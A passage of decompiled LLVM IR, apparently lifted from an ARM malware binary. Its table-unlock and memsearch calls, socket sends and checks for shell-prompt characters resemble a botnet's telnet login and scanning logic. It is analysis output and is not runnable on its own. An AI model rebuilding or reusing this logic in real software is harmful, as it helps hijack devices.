  %v3_fe3c = call i32 @table_retrieve_val(i32 30, i32* nonnull %stack_var_-60)
  %v3_fe40 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fe3c, i32* %r2.global-to-local, align 4
  %v1_fe48 = add i32 %v3_fe40, -1
  store i32 %v1_fe48, i32* %r3.global-to-local, align 4
  %v0_fe4c = load i32, i32* @fp, align 4
  %v0_fe50 = load i32, i32* @r6, align 4
  %v1_fe50 = add i32 %v0_fe50, 24
  %v2_fe50 = inttoptr i32 %v1_fe50 to i32*
  %v3_fe50 = load i32, i32* %v2_fe50, align 4
  store i32 %v3_fe50, i32* %r1.global-to-local, align 4
  %v4_fe54 = call i32 @util_memsearch(i32 %v0_fe4c, i32 %v3_fe50, i32 %v3_fe3c, i32 %v1_fe48)
  %v1_fe58 = add i32 %v4_fe54, 1
  store i32 %v1_fe58, i32* @r7, align 4
  %v2_fe58 = icmp eq i32 %v4_fe54, -1
  store i1 %v2_fe58, i1* %cpsr_c.global-to-local, align 1
  %v7_fe58 = icmp eq i32 %v1_fe58, 0
  store i1 %v7_fe58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe58, label %dec_label_pc_10410.loopexit, label %dec_label_pc_fe68

dec_label_pc_fe68:                                ; preds = %dec_label_pc_fe28
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  %v1_fe6c = call i32 @table_lock_val(i32 30)
  br label %dec_label_pc_fe70

dec_label_pc_fe70:                                ; preds = %dec_label_pc_1015c, %dec_label_pc_fe68
  %v0_fe70 = load i32, i32* @r6, align 4
  %v1_fe70 = inttoptr i32 %v0_fe70 to i32*
  %v2_fe70 = load i32, i32* %v1_fe70, align 4
  store i32 %v2_fe70, i32* %r3.global-to-local, align 4
  %v1_fe74 = add i32 %v0_fe70, 4
  %v2_fe74 = inttoptr i32 %v1_fe74 to i32*
  %v3_fe74 = load i32, i32* %v2_fe74, align 4
  %v1_fe78 = add i32 %v2_fe70, 13
  %v2_fe78 = inttoptr i32 %v1_fe78 to i8*
  %v3_fe78 = load i8, i8* %v2_fe78, align 1
  %v4_fe78 = zext i8 %v3_fe78 to i32
  store i32 %v4_fe78, i32* %r2.global-to-local, align 4
  %v1_fe7c = add i32 %v2_fe70, 4
  %v2_fe7c = inttoptr i32 %v1_fe7c to i32*
  %v3_fe7c = load i32, i32* %v2_fe7c, align 4
  store i32 %v3_fe7c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fe84 = call i32 @__libc_send(i32 %v3_fe74, i32 %v3_fe7c, i32 %v4_fe78, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fe8c = load i32, i32* @r6, align 4
  %v1_fe8c = add i32 %v0_fe8c, 4
  %v2_fe8c = inttoptr i32 %v1_fe8c to i32*
  %v3_fe8c = load i32, i32* %v2_fe8c, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_fe98 = call i32 @__libc_send(i32 %v3_fe8c, i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32 2, i32 16384)
  store i32 5, i32* @r3, align 4
  %v1_fea0 = load i32, i32* @r6, align 4
  %v2_fea0 = add i32 %v1_fea0, 12
  %v3_fea0 = inttoptr i32 %v2_fea0 to i32*
  store i32 5, i32* %v3_fea0, align 4
  br label %dec_label_pc_f8fc

dec_label_pc_fea8:                                ; preds = %dec_label_pc_f734
  %v1_fea8 = add i32 %v0_f734, 24
  %v2_fea8 = inttoptr i32 %v1_fea8 to i32*
  %v3_fea8 = load i32, i32* %v2_fea8, align 4
  store i32 %v3_fea8, i32* %r2.global-to-local, align 4
  %v1_feac = add i32 %v3_fea8, -1
  store i32 %v1_feac, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_feb0 = icmp eq i32 %v1_feac, 0
  store i1 %v2_feb0, i1* %cpsr_z.global-to-local, align 1
  %tmp449 = icmp slt i32 %v1_feac, 1
  br i1 %tmp449, label %dec_label_pc_f6b4.backedge.thread, label %dec_label_pc_feb8

dec_label_pc_feb8:                                ; preds = %dec_label_pc_fea8
  %v2_feb8 = add i32 %v1_feac, %v0_f734
  store i32 %v2_feb8, i32* %r3.global-to-local, align 4
  %v1_febc = add i32 %v2_feb8, 28
  %v2_febc = inttoptr i32 %v1_febc to i8*
  %v3_febc = load i8, i8* %v2_febc, align 1
  %v4_febc = zext i8 %v3_febc to i32
  store i32 %v4_febc, i32* %r3.global-to-local, align 4
  %v2_fec0 = icmp ugt i8 %v3_febc, 61
  store i1 %v2_fec0, i1* %cpsr_c.global-to-local, align 1
  %v7_fec0 = icmp eq i8 %v3_febc, 62
  store i1 %v7_fec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fec0, label %dec_label_pc_ff24, label %bb450

bb450:                                            ; preds = %dec_label_pc_feb8
  %v3_fec4 = icmp ugt i8 %v3_febc, 57
  store i1 %v3_fec4, i1* %cpsr_c.global-to-local, align 1
  %v8_fec4 = icmp eq i8 %v3_febc, 58
  store i1 %v8_fec4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fec4, label %dec_label_pc_ff24, label %dec_label_pc_fecc

dec_label_pc_fecc:                                ; preds = %bb450
  %v2_fecc = icmp ugt i8 %v3_febc, 35
  store i1 %v2_fecc, i1* %cpsr_c.global-to-local, align 1
  %v7_fecc = icmp eq i8 %v3_febc, 36
  store i1 %v7_fecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fecc, label %dec_label_pc_ff24, label %dec_label_pc_fed4

dec_label_pc_fed4:                                ; preds = %dec_label_pc_fecc
  %v2_fed4 = icmp ugt i8 %v3_febc, 34
  store i1 %v2_fed4, i1* %cpsr_c.global-to-local, align 1
  %v7_fed4 = icmp eq i8 %v3_febc, 35
  store i1 %v7_fed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fed4, label %dec_label_pc_ff24, label %dec_label_pc_fedc

dec_label_pc_fedc:                                ; preds = %dec_label_pc_fed4
  %v2_fedc = icmp ugt i8 %v3_febc, 36
  store i1 %v2_fedc, i1* %cpsr_c.global-to-local, align 1
  %v7_fedc = icmp eq i8 %v3_febc, 37
  store i1 %v7_fedc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fedc, label %dec_label_pc_ff24, label %dec_label_pc_ff0c.preheader

dec_label_pc_ff0c.preheader:                      ; preds = %dec_label_pc_fedc
  %v3_fee0 = add i32 %v0_f734, 28
  %v2_fee4 = add i32 %v3_fee0, %v3_fea8
  store i32 %v2_fee4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ff0c

dec_label_pc_fef0:                                ; preds = %bb451
  %v2_fef0 = icmp ugt i8 %v3_ff14, 35
  store i1 %v2_fef0, i1* %cpsr_c.global-to-local, align 1
  %v7_fef0 = icmp eq i8 %v3_ff14, 36
  store i1 %v7_fef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fef0, label %dec_label_pc_ff24, label %dec_label_pc_fef8

dec_label_pc_fef8:                                ; preds = %dec_label_pc_fef0
  %v2_fef8 = icmp ugt i8 %v3_ff14, 34
  store i1 %v2_fef8, i1* %cpsr_c.global-to-local, align 1
  %v7_fef8 = icmp eq i8 %v3_ff14, 35
  store i1 %v7_fef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fef8, label %dec_label_pc_ff24, label %dec_label_pc_ff00

dec_label_pc_ff00:                                ; preds = %dec_label_pc_fef8
  %v2_ff00 = icmp ugt i8 %v3_ff14, 36
  store i1 %v2_ff00, i1* %cpsr_c.global-to-local, align 1
  %v7_ff00 = icmp eq i8 %v3_ff14, 37
  store i1 %v7_ff00, i1* %cpsr_z.global-to-local, align 1
  %v1_ff04 = add i32 %v0_ff04, -1
  store i32 %v1_ff04, i32* %r3.global-to-local, align 4
  br i1 %v7_ff00, label %dec_label_pc_ff24, label %dec_label_pc_ff0c

dec_label_pc_ff0c:                                ; preds = %dec_label_pc_ff0c.preheader, %dec_label_pc_ff00
  %v0_ff04 = phi i32 [ %v2_fee4, %dec_label_pc_ff0c.preheader ], [ %v1_ff04, %dec_label_pc_ff00 ]
  %v0_ff0c = phi i32 [ %v1_feac, %dec_label_pc_ff0c.preheader ], [ %v1_ff0c, %dec_label_pc_ff00 ]
  %v1_ff0c = add i32 %v0_ff0c, -1
  store i32 %v1_ff0c, i32* %r1.global-to-local, align 4
  %v2_ff0c = icmp ne i32 %v0_ff0c, 0
  store i1 %v2_ff0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff0c = icmp eq i32 %v0_ff0c, 1
  store i1 %v7_ff0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff0c, label %dec_label_pc_f6b4.backedge.thread562, label %dec_label_pc_ff14

dec_label_pc_ff14:                                ; preds = %dec_label_pc_ff0c
  %v1_ff14 = add i32 %v0_ff04, -2
  %v2_ff14 = inttoptr i32 %v1_ff14 to i8*
  %v3_ff14 = load i8, i8* %v2_ff14, align 1
  %v4_ff14 = zext i8 %v3_ff14 to i32
  store i32 %v4_ff14, i32* %r2.global-to-local, align 4
  %v2_ff18 = icmp ugt i8 %v3_ff14, 61
  store i1 %v2_ff18, i1* %cpsr_c.global-to-local, align 1
  %v7_ff18 = icmp eq i8 %v3_ff14, 62
  store i1 %v7_ff18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff18, label %dec_label_pc_ff24, label %bb451

bb451:                                            ; preds = %dec_label_pc_ff14
  %v3_ff1c = icmp ugt i8 %v3_ff14, 57
  store i1 %v3_ff1c, i1* %cpsr_c.global-to-local, align 1
  %v8_ff1c = icmp eq i8 %v3_ff14, 58
  store i1 %v8_ff1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ff1c, label %dec_label_pc_ff24, label %dec_label_pc_fef0

dec_label_pc_ff24:                                ; preds = %dec_label_pc_ff14, %bb451, %dec_label_pc_ff00, %dec_label_pc_fef8, %dec_label_pc_fef0, %dec_label_pc_fedc, %dec_label_pc_feb8, %dec_label_pc_fed4, %dec_label_pc_fecc, %bb450
  %v0_ff28 = phi i32 [ %v1_feac, %dec_label_pc_fedc ], [ %v1_feac, %dec_label_pc_feb8 ], [ %v1_feac, %dec_label_pc_fed4 ], [ %v1_feac, %dec_label_pc_fecc ], [ %v1_feac, %bb450 ], [ %v1_ff0c, %dec_label_pc_fef0 ], [ %v1_ff0c, %dec_label_pc_fef8 ], [ %v1_ff0c, %dec_label_pc_ff00 ], [ %v1_ff0c, %bb451 ], [ %v1_ff0c, %dec_label_pc_ff14 ]
  %v1_ff28 = add i32 %v0_ff28, 1
  store i32 %v1_ff28, i32* @r7, align 4
  %v1_ff2c = call i32 @table_unlock_val(i32 6)
  store i32 %v2_1000c, i32* %r1.global-to-local, align 4
  %v3_ff3c = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  %v3_ff40 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_ff40, i32* %r2.global-to-local, align 4
  store i32 %v3_ff3c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ff4c = load i32, i32* @r6, align 4
  %v1_ff4c = add i32 %v0_ff4c, 4
  %v2_ff4c = inttoptr i32 %v1_ff4c to i32*
  %v3_ff4c = load i32, i32* %v2_ff4c, align 4
  %v4_ff50 = call i32 @__libc_send(i32 %v3_ff4c, i32 %v3_ff3c, i32 %v3_ff40, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ff60 = load i32, i32* @r6, align 4
  %v1_ff60 = add i32 %v0_ff60, 4
  %v2_ff60 = inttoptr i32 %v1_ff60 to i32*
  %v3_ff60 = load i32, i32* %v2_ff60, align 4
  %v4_ff64 = call i32 @__libc_send(i32 %v3_ff60, i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32 2, i32 16384)
  %v1_ff6c = call i32 @table_lock_val(i32 6)
  store i32 8, i32* @r3, align 4
  %v1_ff74 = load i32, i32* @r6, align 4
  %v2_ff74 = add i32 %v1_ff74, 12
  %v3_ff74 = inttoptr i32 %v2_ff74 to i32*
  store i32 8, i32* %v3_ff74, align 4
  br label %dec_label_pc_f904

dec_label_pc_ff7c:                                ; preds = %dec_label_pc_f734
  %v1_ff7c = add i32 %v0_f734, 24
  %v2_ff7c = inttoptr i32 %v1_ff7c to i32*
  %v3_ff7c = load i32, i32* %v2_ff7c, align 4
  store i32 %v3_ff7c, i32* %r2.global-to-local, align 4
  %v1_ff80 = add i32 %v3_ff7c, -1
  store i32 %v1_ff80, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff84 = icmp eq i32 %v1_ff80, 0
  store i1 %v2_ff84, i1* %cpsr_z.global-to-local, align 1
  %tmp452 = icmp slt i32 %v1_ff80, 1
  br i1 %tmp452, label %dec_label_pc_fff8, label %dec_label_pc_ff8c

dec_label_pc_ff8c:                                ; preds = %dec_label_pc_ff7c
  %v2_ff8c = add i32 %v1_ff80, %v0_f734
  store i32 %v2_ff8c, i32* %r3.global-to-local, align 4
  %v1_ff90 = add i32 %v2_ff8c, 28
  %v2_ff90 = inttoptr i32 %v1_ff90 to i8*
  %v3_ff90 = load i8, i8* %v2_ff90, align 1
  %v4_ff90 = zext i8 %v3_ff90 to i32
  store i32 %v4_ff90, i32* %r3.global-to-local, align 4
  %v2_ff94 = icmp ugt i8 %v3_ff90, 61
  store i1 %v2_ff94, i1* %cpsr_c.global-to-local, align 1
  %v7_ff94 = icmp eq i8 %v3_ff90, 62
  store i1 %v7_ff94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff94, label %dec_label_pc_10110, label %bb453

bb453:                                            ; preds = %dec_label_pc_ff8c
  %v3_ff98 = icmp ugt i8 %v3_ff90, 57
  store i1 %v3_ff98, i1* %cpsr_c.global-to-local, align 1
  %v8_ff98 = icmp eq i8 %v3_ff90, 58
  store i1 %v8_ff98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ff98, label %dec_label_pc_10110, label %dec_label_pc_ffa0

dec_label_pc_ffa0:                                ; preds = %bb453
  %v2_ffa0 = icmp ugt i8 %v3_ff90, 35
  store i1 %v2_ffa0, i1* %cpsr_c.global-to-local, align 1
  %v7_ffa0 = icmp eq i8 %v3_ff90, 36
  store i1 %v7_ffa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffa0, label %dec_label_pc_10110, label %dec_label_pc_ffa8

dec_label_pc_ffa8:                                ; preds = %dec_label_pc_ffa0
  %v2_ffa8 = icmp ugt i8 %v3_ff90, 34
  store i1 %v2_ffa8, i1* %cpsr_c.global-to-local, align 1
  %v7_ffa8 = icmp eq i8 %v3_ff90, 35
  store i1 %v7_ffa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffa8, label %dec_label_pc_10110, label %dec_label_pc_ffb0

dec_label_pc_ffb0:                                ; preds = %dec_label_pc_ffa8
  %v2_ffb0 = icmp ugt i8 %v3_ff90, 36
  store i1 %v2_ffb0, i1* %cpsr_c.global-to-local, align 1
  %v7_ffb0 = icmp eq i8 %v3_ff90, 37
  store i1 %v7_ffb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffb0, label %dec_label_pc_10110, label %dec_label_pc_fff0.preheader

dec_label_pc_fff0.preheader:                      ; preds = %dec_label_pc_ffb0
  %v3_ffb4 = add i32 %v0_f734, 28
  %v2_ffb8 = add i32 %v3_ffb4, %v3_ff7c
  store i32 %v2_ffb8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fff0

dec_label_pc_ffc4:                                ; preds = %dec_label_pc_fff0
  %v1_ffc4 = add i32 %v0_ffe8, -2
  %v2_ffc4 = inttoptr i32 %v1_ffc4 to i8*
  %v3_ffc4 = load i8, i8* %v2_ffc4, align 1
  %v4_ffc4 = zext i8 %v3_ffc4 to i32
  store i32 %v4_ffc4, i32* %r2.global-to-local, align 4
  %v2_ffc8 = icmp ugt i8 %v3_ffc4, 61
  store i1 %v2_ffc8, i1* %cpsr_c.global-to-local, align 1
  %v7_ffc8 = icmp eq i8 %v3_ffc4, 62
  store i1 %v7_ffc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffc8, label %dec_label_pc_10110, label %bb454

bb454:                                            ; preds = %dec_label_pc_ffc4
  %v3_ffcc = icmp ugt i8 %v3_ffc4, 57
  store i1 %v3_ffcc, i1* %cpsr_c.global-to-local, align 1
  %v8_ffcc = icmp eq i8 %v3_ffc4, 58
  store i1 %v8_ffcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ffcc, label %dec_label_pc_10110, label %dec_label_pc_ffd4

dec_label_pc_ffd4:                                ; preds = %bb454
  %v2_ffd4 = icmp ugt i8 %v3_ffc4, 35
  store i1 %v2_ffd4, i1* %cpsr_c.global-to-local, align 1
  %v7_ffd4 = icmp eq i8 %v3_ffc4, 36
  store i1 %v7_ffd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffd4, label %dec_label_pc_10110, label %dec_label_pc_ffdc

dec_label_pc_ffdc:                                ; preds = %dec_label_pc_ffd4
  %v2_ffdc = icmp ugt i8 %v3_ffc4, 34
  store i1 %v2_ffdc, i1* %cpsr_c.global-to-local, align 1
  %v7_ffdc = icmp eq i8 %v3_ffc4, 35
  store i1 %v7_ffdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffdc, label %dec_label_pc_10110, label %dec_label_pc_ffe4

dec_label_pc_ffe4:                                ; preds = %dec_label_pc_ffdc
  %v2_ffe4 = icmp ugt i8 %v3_ffc4, 36
  store i1 %v2_ffe4, i1* %cpsr_c.global-to-local, align 1
  %v7_ffe4 = icmp eq i8 %v3_ffc4, 37
  store i1 %v7_ffe4, i1* %cpsr_z.global-to-local, align 1
  %v1_ffe8 = add i32 %v0_ffe8, -1
  store i32 %v1_ffe8, i32* %r3.global-to-local, align 4
  br i1 %v7_ffe4, label %dec_label_pc_10110, label %dec_label_pc_fff0

dec_label_pc_fff0:                                ; preds = %dec_label_pc_fff0.preheader, %dec_label_pc_ffe4
  %v0_ffe8 = phi i32 [ %v2_ffb8, %dec_label_pc_fff0.preheader ], [ %v1_ffe8, %dec_label_pc_ffe4 ]
  %v0_fff0 = phi i32 [ %v1_ff80, %dec_label_pc_fff0.preheader ], [ %v1_fff0, %dec_label_pc_ffe4 ]
  %v1_fff0 = add i32 %v0_fff0, -1
  store i32 %v1_fff0, i32* %r1.global-to-local, align 4
  %v2_fff0 = icmp ne i32 %v0_fff0, 0
  store i1 %v2_fff0, i1* %cpsr_c.global-to-local, align 1
  %v7_fff0 = icmp eq i32 %v0_fff0, 1
  store i1 %v7_fff0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fff0, label %dec_label_pc_fff8, label %dec_label_pc_ffc4

dec_label_pc_fff8:                                ; preds = %dec_label_pc_fff0, %dec_label_pc_ff7c
  %v1_fffc = call i32 @table_unlock_val(i32 31)
  %v1_10004 = call i32 @table_unlock_val(i32 32)
  store i32 %v2_1000c, i32* %r1.global-to-local, align 4
  %v3_10014 = call i32 @table_retrieve_val(i32 31, i32* nonnull %stack_var_-60)
  store i32 %v3_10014, i32* @r4, align 4
  store i32 %v2_1000c, i32* %r1.global-to-local, align 4
  %v3_10028 = call i32 @table_retrieve_val(i32 32, i32* nonnull %stack_var_-60)
  %v3_1002c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10028, i32* @r5, align 4
  %v0_10034 = load i32, i32* @r4, align 4
  store i32 %v0_10034, i32* %r2.global-to-local, align 4
  %v1_10038 = add i32 %v3_1002c, -1
  store i32 %v1_10038, i32* %r3.global-to-local, align 4
  %v0_1003c = load i32, i32* @fp, align 4
  %v0_10040 = load i32, i32* @r6, align 4
  %v1_10040 = add i32 %v0_10040, 24
  %v2_10040 = inttoptr i32 %v1_10040 to i32*
  %v3_10040 = load i32, i32* %v2_10040, align 4
  store i32 %v3_10040, i32* %r1.global-to-local, align 4
  %v4_10044 = call i32 @util_memsearch(i32 %v0_1003c, i32 %v3_10040, i32 %v0_10034, i32 %v1_10038)
  %v2_10048 = icmp eq i32 %v4_10044, -1
  store i1 %v2_10048, i1* %cpsr_c.global-to-local, align 1
  %v7_10048 = icmp eq i32 %v4_10044, -1
  store i1 %v7_10048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10048, label %dec_label_pc_10058, label %dec_label_pc_10080

dec_label_pc_10058:                               ; preds = %dec_label_pc_fff8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_10058 = load i32, i32* %stack_var_-60, align 4
  %v0_1005c = load i32, i32* @r5, align 4
  store i32 %v0_1005c, i32* %r2.global-to-local, align 4
  %v1_10060 = add i32 %v3_10058, -1
  store i32 %v1_10060, i32* %r3.global-to-local, align 4
  %v0_10064 = load i32, i32* @fp, align 4
  %v0_10068 = load i32, i32* @r6, align 4
  %v1_10068 = add i32 %v0_10068, 24
  %v2_10068 = inttoptr i32 %v1_10068 to i32*
  %v3_10068 = load i32, i32* %v2_10068, align 4
  store i32 %v3_10068, i32* %r1.global-to-local, align 4
  %v4_1006c = call i32 @util_memsearch(i32 %v0_10064, i32 %v3_10068, i32 %v0_1005c, i32 %v1_10060)
  %v1_10070 = add i32 %v4_1006c, 1
  store i32 %v1_10070, i32* @r7, align 4
  %v2_10070 = icmp eq i32 %v4_1006c, -1
  store i1 %v2_10070, i1* %cpsr_c.global-to-local, align 1
  %v7_10070 = icmp eq i32 %v1_10070, 0
  store i1 %v7_10070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10070, label %dec_label_pc_10420, label %dec_label_pc_10080

dec_label_pc_10080:                               ; preds = %dec_label_pc_10058, %dec_label_pc_fff8
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  %v1_10084 = call i32 @table_lock_val(i32 31)
  %v1_1008c = call i32 @table_lock_val(i32 32)
  %v0_10090 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10090 = icmp eq i32 %v0_10090, 0
  store i1 %v2_10090, i1* %cpsr_z.global-to-local, align 1
  %tmp455 = icmp slt i32 %v0_10090, 1
  br i1 %tmp455, label %dec_label_pc_f8fc, label %dec_label_pc_10124

dec_label_pc_1009c:                               ; preds = %dec_label_pc_fa44
  store i32 %v2_100a0, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_19b00.210 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_100a0, i32* @r0, align 4
  store i32 %v2_100b4, i32* @sl, align 4
  %v0_100b8 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_100b4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19af7.212 to i32), i32* @r1, align 4
  %v0_100c8 = call i32 @memcpy()
  %v0_100cc = load i32, i32* @r6, align 4
  %v1_100cc = add i32 %v0_100cc, 24
  %v2_100cc = inttoptr i32 %v1_100cc to i32*
  %v3_100cc = load i32, i32* %v2_100cc, align 4
  %v0_100d0 = load i32, i32* @r4, align 4
  %v1_100d0 = add i32 %v0_100d0, 2
  store i32 %v1_100d0, i32* %r2.global-to-local, align 4
  %v0_100d4 = load i32, i32* @fp, align 4
  %v2_100d4 = add i32 %v0_100d4, %v3_100cc
  store i32 %v2_100d4, i32* @r3, align 4
  %v3_100d8 = icmp uge i32 %v2_100d4, %v1_100d0
  store i1 %v3_100d8, i1* %cpsr_c.global-to-local, align 1
  %v9_100d8 = icmp eq i32 %v2_100d4, %v1_100d0
  store i1 %v9_100d8, i1* %cpsr_z.global-to-local, align 1
  %v2_100dc = xor i1 %v3_100d8, true
  %v3_100dc = or i1 %v9_100d8, %v2_100dc
  br i1 %v3_100dc, label %dec_label_pc_1009c.dec_label_pc_fac0.loopexit_crit_edge, label %dec_label_pc_100e0

dec_label_pc_1009c.dec_label_pc_fac0.loopexit_crit_edge: ; preds = %dec_label_pc_1009c
  %v0_fac0.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fac0

dec_label_pc_100e0:                               ; preds = %dec_label_pc_1009c
  %v2_100e0 = inttoptr i32 %v1_100d0 to i8*
  %v3_100e0 = load i8, i8* %v2_100e0, align 1
  %v4_100e0 = zext i8 %v3_100e0 to i32
  store i32 %v4_100e0, i32* %r3.global-to-local, align 4
  %v2_100e4 = icmp ugt i8 %v3_100e0, 30
  store i1 %v2_100e4, i1* %cpsr_c.global-to-local, align 1
  %v7_100e4 = icmp eq i8 %v3_100e0, 31
  store i1 %v7_100e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100e4, label %dec_label_pc_101b0, label %dec_label_pc_100ec

dec_label_pc_100ec:                               ; preds = %dec_label_pc_100e0
  %v1_100ec = inttoptr i32 %v0_100d0 to i8*
  %v2_100ec = load i8, i8* %v1_100ec, align 1
  %v3_100ec = zext i8 %v2_100ec to i32
  store i32 %v3_100ec, i32* %r3.global-to-local, align 4
  %v2_100f0 = icmp ugt i8 %v2_100ec, -4
  store i1 %v2_100f0, i1* %cpsr_c.global-to-local, align 1
  %v7_100f0 = icmp eq i8 %v2_100ec, -3
  store i1 %v7_100f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100f0, label %.thread147, label %dec_label_pc_10100

.thread147:                                       ; preds = %dec_label_pc_100ec
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_100ec, align 1
  %v0_100fc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_100fc.pr.pr, label %dec_label_pc_fa58, label %.thread147.dec_label_pc_10100thread-pre-split_crit_edge

.thread147.dec_label_pc_10100thread-pre-split_crit_edge: ; preds = %.thread147
  %v0_10100.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10100

dec_label_pc_10100:                               ; preds = %dec_label_pc_100ec, %.thread147.dec_label_pc_10100thread-pre-split_crit_edge
  %v0_10100.pr = phi i32 [ %v0_10100.pr.pre, %.thread147.dec_label_pc_10100thread-pre-split_crit_edge ], [ %v3_100ec, %dec_label_pc_100ec ]
  %v2_10100 = icmp ugt i32 %v0_10100.pr, 250
  store i1 %v2_10100, i1* %cpsr_c.global-to-local, align 1
  %v7_10100 = icmp eq i32 %v0_10100.pr, 251
  store i1 %v7_10100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10100, label %bb456, label %dec_label_pc_fa58

bb456:                                            ; preds = %dec_label_pc_10100
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_10108 = load i32, i32* @r4, align 4
  %v4_10108 = inttoptr i32 %v3_10108 to i8*
  store i8 -3, i8* %v4_10108, align 1
  br label %dec_label_pc_fa58

dec_label_pc_10110:                               ; preds = %dec_label_pc_ffc4, %dec_label_pc_ffe4, %dec_label_pc_ffdc, %dec_label_pc_ffd4, %bb454, %dec_label_pc_ffb0, %dec_label_pc_ff8c, %dec_label_pc_ffa8, %dec_label_pc_ffa0, %bb453
  %v0_10114 = phi i32 [ %v1_ff80, %dec_label_pc_ffb0 ], [ %v1_ff80, %dec_label_pc_ff8c ], [ %v1_ff80, %dec_label_pc_ffa8 ], [ %v1_ff80, %dec_label_pc_ffa0 ], [ %v1_ff80, %bb453 ], [ %v1_fff0, %bb454 ], [ %v1_fff0, %dec_label_pc_ffd4 ], [ %v1_fff0, %dec_label_pc_ffdc ], [ %v1_fff0, %dec_label_pc_ffe4 ], [ %v1_fff0, %dec_label_pc_ffc4 ]
  %v1_10114 = add i32 %v0_10114, 1
  store i32 %v1_10114, i32* @r7, align 4
  %v1_10118 = call i32 @table_lock_val(i32 31)
  %v1_10120 = call i32 @table_lock_val(i32 32)
  br label %dec_label_pc_10124

dec_label_pc_10124:                               ; preds = %dec_label_pc_10080, %dec_label_pc_10110
  %v0_10124 = load i32, i32* @r6, align 4
  %v1_10124 = inttoptr i32 %v0_10124 to i32*
  %v2_10124 = load i32, i32* %v1_10124, align 4
  store i32 %v2_10124, i32* %r3.global-to-local, align 4
  %v1_10128 = add i32 %v0_10124, 4
  %v2_10128 = inttoptr i32 %v1_10128 to i32*
  %v3_10128 = load i32, i32* %v2_10128, align 4
  %v1_1012c = add i32 %v2_10124, 12
  %v2_1012c = inttoptr i32 %v1_1012c to i8*
  %v3_1012c = load i8, i8* %v2_1012c, align 1
  %v4_1012c = zext i8 %v3_1012c to i32
  store i32 %v4_1012c, i32* %r2.global-to-local, align 4
  %v1_10130 = inttoptr i32 %v2_10124 to i32*
  %v2_10130 = load i32, i32* %v1_10130, align 4
  store i32 %v2_10130, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10138 = call i32 @__libc_send(i32 %v3_10128, i32 %v2_10130, i32 %v4_1012c, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10140 = load i32, i32* @r6, align 4
  %v1_10140 = add i32 %v0_10140, 4
  %v2_10140 = inttoptr i32 %v1_10140 to i32*
  %v3_10140 = load i32, i32* %v2_10140, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
